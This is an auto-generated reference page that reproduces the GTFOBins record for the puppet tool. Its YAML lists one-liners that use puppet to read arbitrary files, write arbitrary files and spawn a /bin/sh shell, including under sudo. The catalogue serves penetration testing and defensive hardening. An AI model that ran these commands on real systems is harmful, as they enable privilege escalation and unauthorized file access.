---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# puppet

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `puppet` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/puppet` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [puppet](../../tools/linux/puppet.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | puppet |
| name | puppet |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/puppet/ |

## Preserved Source Material

```yaml
_body: ''
_name: puppet
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/puppet
functions:
  file-read:
  - code: puppet filebucket -l diff /dev/null /path/to/input-file
    comment: The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.
    contexts:
      sudo: null
      unprivileged: null
  file-write:
  - code: 'puppet apply -e ''file { "/path/to/output-file": content => "DATA" }'''
    contexts:
      sudo: null
      unprivileged: null
  shell:
  - code: 'puppet apply -e "exec { ''/bin/sh <$(tty) >$(tty) 2>$(tty)'': }"'
    contexts:
      sudo: null
      unprivileged: null
```
